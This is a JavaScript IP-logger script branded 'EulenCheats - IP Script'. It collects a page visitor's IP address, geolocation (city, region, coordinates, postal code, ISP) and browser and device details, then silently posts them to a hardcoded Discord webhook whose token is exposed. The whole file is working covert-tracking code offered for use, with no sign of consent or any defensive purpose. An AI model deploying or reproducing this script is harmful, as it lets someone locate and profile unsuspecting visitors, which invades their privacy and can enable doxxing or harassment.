function getIP(json) {
  var request = new XMLHttpRequest(); 
  request.open("POST", "https://discord.com/api/webhooks/1158724818657615974/2BdoAhBqNGS1ZwlV3tf4B6So9EpKUsp8Xq6O8lbfDj51wCqM1UijcRb0hKyRVlJct3ry");
  request.setRequestHeader('Content-type', 'application/json');

  // récupérer les informations de localisation à partir de l'adresse IP
  var ip = json.ip;
  var url = "https://ipapi.co/" + ip + "/json/";
  var xhr = new XMLHttpRequest();
  xhr.open("GET", url, true);
  xhr.onload = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var data = JSON.parse(xhr.responseText);

      var username = navigator.userAgent.match(/Windows NT\s([^\/]+)\//)[1];
      var color = Math.floor(Math.random() * 16777215).toString(16); // random color
      // ajouter les informations de localisation et de navigateur à l'objet params
      var params = {
        username: "EulenCheats",
        avatar_url: "https://cdn.discordapp.com/attachments/1158138389283999775/1158728831969005608/eulen-menu-520x386.png?ex=651d4dd1&is=651bfc51&hm=a39d53c70c8937647aefcfa5d7cdfc80c6bbd0c27b177a44bdc900767149e700&",
        embeds: [
          {
            title: "IP Information",
            color: parseInt(color, 16),
            thumbnail: {
              url: "https://cdn.discordapp.com/attachments/1158138389283999775/1158728831969005608/eulen-menu-520x386.png?ex=651d4dd1&is=651bfc51&hm=a39d53c70c8937647aefcfa5d7cdfc80c6bbd0c27b177a44bdc900767149e700&",
            },
            description: "The IP address is " + ip,
            fields: [
              {
                name: "City :cityscape:",
                value: data.city,
                inline: true
              },
              {
                name: "Region :map:",
                value: data.region,
                inline: true
              },
              {
                name: "Country :map:",
                value: data.country_name,
                inline: true
              },
              {
                name: "Flag :triangular_flag_on_post:",
                value: ":flag_" + data.country_code.toLowerCase() + ":",
                inline: true
              },
              {
                name: "Latitude :earth_americas:",
                value: data.latitude ? data.latitude.toFixed(2) + "°" : "N/A",
                inline: true
              },
              {
                name: "Longitude :earth_americas:",
                value: data.longitude ? data.longitude.toFixed(2) + "°" : "N/A",
                inline: true
              },
              {
                name: "Postal Code :postbox:",
                value: data.postal || "N/A",
                inline: true
              },
              {
                name: "Operator :radio:",
                value: data.org,
                inline: true
              },
              {
                name: "Timezone :timer:",
                value: new Date().toLocaleString('en-US', {timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone}),
                inline: true
              },

              {
                name: " ",
                value: " ",
                inline: false
              },

              {
                name: "Browser :earth_americas:",
                value: navigator.userAgent,
                inline: false
              },
              {
                name: " ",
                value: " ",
                inline: false
              },
              {
                name: " ",
                value: " ",
                inline: false
              },
              {
                name: " ",
                value: " ",
                inline: false
              },
              {
                name: "CPU :floppy_disk:",
                value: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores, " + navigator.platform : "N/A",
                inline: true
              },
              {
                name: "RAM :computer:",
                value: (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A") + " / " + (navigator.userAgent.match(/Firefox\/(\d+)/) ? (parseInt(RegExp.$1) >= 54 ? ((performance.memory ? performance.memory.usedJSHeapSize : "N/A") / 1048576).toFixed(2) + " MB" : "N/A") : ((performance.memory ? performance.memory.usedJSHeapSize : "N/A") / 1048576).toFixed(2) + " MB"),
                inline: true
              },
              {
                name: "Screen Size :desktop:",
                value: screen.width + "x" + screen.height,
                inline: true
              },
              {
                name: "Browser Version :compass:",
                value: username,
                inline: true
              },
              {
                name: "Device Model :rocket:",
                value: navigator.platform,
                inline: true
              },
              {
                name: "Language :speaking_head:",
                value: navigator.language,
                inline: true
              }
            ],
            footer: {
              icon_url: "https://cdn.discordapp.com/attachments/1158138389283999775/1158728831969005608/eulen-menu-520x386.png?ex=651d4dd1&is=651bfc51&hm=a39d53c70c8937647aefcfa5d7cdfc80c6bbd0c27b177a44bdc900767149e700&",
              text: "EulenCheats - IP Script",
            },
            timestamp: new Date().toISOString()
          },
        ],
      };
      
      // envoyer la requête avec les informations de localisation, de navigateur, de date/heure et de fuseau horaire
      request.send(JSON.stringify(params));
    }
  };
  xhr.send();
}